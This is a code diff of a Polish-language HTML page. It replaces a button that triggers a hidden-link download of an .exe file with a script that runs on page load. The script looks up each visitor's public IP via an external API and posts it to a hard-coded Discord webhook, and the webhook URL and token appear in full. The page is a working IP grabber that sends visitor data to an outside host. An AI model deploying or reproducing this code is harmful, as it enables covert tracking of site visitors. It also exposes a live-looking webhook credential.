@@ -1,25 +1,37 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pobierz plik</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wyślij IP na Discord</title>
 </head>
 <body>
-    <h1>Pobierz plik po kliknięciu przycisku</h1>
-    <p>Kliknij przycisk, aby pobrać plik.</p>
+  <h1>Strona testowa</h1>
+  <p>Twoje IP zostanie przesłane na Discorda po załadowaniu strony.</p>
 
-    <!-- Przycisk, który uruchamia pobieranie -->
-    <button id="downloadButton">Pobierz plik</button>
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1295740220507033653/ZtAyFre9GdhE3Z07Dlk-4M5zKm6ZVX2kO_ROiZeawfShFy1mDNCdd_grGNXMvBtvxTML"; // Wklej URL webhooka Discorda
 
-    <!-- Ukryty link do pobierania pliku -->
-    <a id="downloadLink" href="download_file.exe" download="download_file.exe" style="display: none;">Pobierz plik</a>
+    // Pobierz IP użytkownika z zewnętrznego API
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const userIp = data.ip;
 
-    <script>
-        // Funkcja, która kliknie na ukryty link po kliknięciu przycisku
-        document.getElementById("downloadButton").addEventListener("click", function() {
-            document.getElementById("downloadLink").click();
-        });
-    </script>
+        // Wyślij IP na Discord
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            content: `Nowe IP odwiedzającego: ${userIp}`,
+          }),
+        })
+          .then(() => console.log(`Wysłano IP: ${userIp}`))
+          .catch(error => console.error("Błąd wysyłania wiadomości:", error));
+      })
+      .catch(error => console.error("Błąd pobierania IP:", error));
+  </script>
 </body>
 </html>
